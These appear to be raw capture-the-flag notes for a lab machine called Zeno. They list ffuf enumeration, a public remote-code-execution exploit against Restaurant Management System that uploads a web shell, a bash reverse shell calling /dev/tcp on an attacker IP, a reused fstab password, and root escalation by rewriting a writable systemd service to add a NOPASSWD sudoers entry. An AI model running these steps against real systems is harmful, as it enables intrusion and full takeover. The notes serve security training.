@@ -1,0 +1,110 @@
+10.10.5.230
+10.10.50.86
+ffuf -u http://10.10.5.230/FUZZ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+ffuf -u http://10.10.5.230:12340/FUZZ -w /usr/share/wordlists/dirb/big.txt -mc 200,301
+
+rms                     [Status: 301, Size: 237, Words: 14, Lines: 8]
+:: Progress: [20469/20469] :: Job [1/1] :: 187 req/sec :: Duration: [0:01:53] :: Errors: 0 ::
+                                                                                               
+                                                                                               
+http://10.10.5.230:12340/rms/
+
+
+ffuf -u http://10.10.50.86:12340/rms/FUZZ -w /usr/share/wordlists/dirb/big.txt -mc 200,301
+
+
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.50.86:12340/rms/FUZZ -e .aspx,.html,.php,.txt
+
+
+searchsploit restaurant management
+---------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------- ---------------------------------
+Restaurant Management System 1.0 - Remote Code Execution                                                  | php/webapps/47520.py
+
+searchsploit -m php/webapps/47520.py
+
+vi 47520.py
+change r = requests.post(target,verify=False, headers=headers,data=data, proxies={"http":"http://127.0.0.1:8080"})
+
+to
+r = requests.post(target,verify=False, headers=headers,data=data)
+#        ,proxies={"http":"http://127.0.0.1:8080"})
+
+mv 47520.py exp.py
+python3 exp.py http://10.10.50.86:12340/rms/
+
+    _  _   _____  __  __  _____   ______            _       _ _
+  _| || |_|  __ \|  \/  |/ ____| |  ____|          | |     (_) |
+ |_  __  _| |__) | \  / | (___   | |__  __  ___ __ | | ___  _| |_
+  _| || |_|  _  /| |\/| |\___ \  |  __| \ \/ / '_ \| |/ _ \| | __|
+ |_  __  _| | \ \| |  | |____) | | |____ >  <| |_) | | (_) | | |_
+   |_||_| |_|  \_\_|  |_|_____/  |______/_/\_\ .__/|_|\___/|_|\__|
+                                             | |
+                                             |_|
+
+
+
+Credits : All InfoSec (Raja Ji's) Group
+[+] Restaurant Management System Exploit, Uploading Shell
+[+] Shell Uploaded. Please check the URL : http://10.10.50.86:12340/rms/images/reverse-shell.php
+
+
+
+
+"http://10.10.50.86:12340/rms/images/reverse-shell.php?\?cmd\=bash+-i+%3E%26+/dev/tcp/10.11.52.16/1337+0%3E%261"
+
+curl "http://10.10.50.86:12340/rms/images/reverse-shell.php\?cmd\=bash+-i+%3E%26+/dev/tcp/10.11.52.16/1337+0%3E%261"
+
+
+
+python3 rm_expoit.py
+with rm_exploit.py
+https://github.com/BJConway/thm_writeups/blob/main/challenges/zeno/rms_exploit.py
+
+nv -lnvp 1337
+
+use linpeas.sh
+You have write privileges over /etc/systemd/system/zeno-monitoring.service                                                                  
+
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ No                                                                                                
+═╣ Credentials in fstab/mtab? ........... /etc/fstab:#//10.10.10.10/secret-share        /mnt/secret-share       cifs    _netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft     0 0    
+
+ssh edward@10.10.50.86
+password:FrobjoodAdkoonceanJa
+
+
+    python3 -c ‘import pty; pty.spawn (“/bin/bash”)’
+
+    export TERM=xterm-256color
+    
+    
+vi /etc/systemd/system/zeno-monitoring.service 
+
+cat /etc/systemd/system/zeno-monitoring.service 
+[Unit]
+Description=Zeno monitoring
+
+[Service]
+Type=simple
+User=root
+#ExecStart=/root/zeno-monitoring.py
+#ExecStart=/bin/bash -c 'cp /bin/bash /home/edward/prev; chmod u+s /home/edward/prev'
+ExecStart=/bin/bash -c 'echo "edward ALL= (root) NOPASSWD: /usr/bin/sudo " >>/etc/sudoers'
+[Install]
+WantedBy=multi-user.target
+
+#ExecStart=/bin/bash -c 'cp /bin/bash /home/edward/prev; chmod u+s /home/edward/prev'
+./prev -p
+
+with
+ExecStart=/bin/bash -c 'echo "edward ALL= (root) NOPASSWD: /usr/bin/sudo " >>/etc/sudoers'
+sudo -u root /usr/bin/sudo /bin/bash -p
+ cat /root/root.txt
+
+
+https://github.com/pentestmonkey/php-reverse-shell
+https://github.com/BJConway/thm_writeups/blob/main/challenges/zeno/zeno.md
+https://0xandrea.medium.com/zeno-thm-machine-writeup-b2644f30e3ef
